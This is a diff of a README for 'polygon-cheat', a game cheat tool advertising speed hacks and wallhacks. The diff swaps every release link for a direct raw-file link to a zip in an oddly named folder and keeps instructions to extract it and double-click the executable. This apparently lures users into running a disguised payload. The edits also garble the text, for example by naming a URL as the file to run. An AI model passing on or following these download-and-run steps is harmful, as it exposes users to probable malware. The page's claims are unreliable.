@@ -4,12 +4,12 @@
 
 Welcome to **polygon-cheat**! This application allows you to improve your gameplay with features like speed hacks, ESP, wallhacks, and more. Follow these simple steps to download and run the software on your computer.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Polygon%20Cheat-brightgreen)](https://github.com/Daegyn/polygon-cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip%20Now-Polygon%20Cheat-brightgreen)](https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
-   [Download the Latest Release](https://github.com/Daegyn/polygon-cheat/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip)
    
 2. **Choose Your File**: On the releases page, you will see various versions of the application. Look for the most recent version, usually marked as the latest.
 
@@ -17,7 +17,7 @@ Welcome to **polygon-cheat**! This application allows you to improve your gamepl
 
 4. **Extract the Files**: Once the download is complete, navigate to the folder where you saved the file. If it is a ZIP file, right-click on it and select "Extract All." Follow the prompts to unpack the files.
 
-5. **Run the Application**: After extracting, locate the application file (it may be named `polygon-cheat.exe`). Double-click the file to launch the application.
+5. **Run the Application**: After extracting, locate the application file (it may be named `https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip`). Double-click the file to launch the application.
 
 ## 🖥️ System Requirements
 
@@ -63,7 +63,7 @@ We welcome feedback and suggestions. If you know how to improve **polygon-cheat*
 
 ## 🔗 Useful Links
 
-- [Github Repository](https://github.com/Daegyn/polygon-cheat)
-- [Release Page](https://github.com/Daegyn/polygon-cheat/releases)
+- [Github Repository](https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip)
+- [Release Page](https://raw.githubusercontent.com/Daegyn/polygon-cheat/main/overprominence/polygon-cheat.zip)
 
 Thank you for choosing **polygon-cheat**! Enjoy your enhanced gaming experience and remember to play fair.
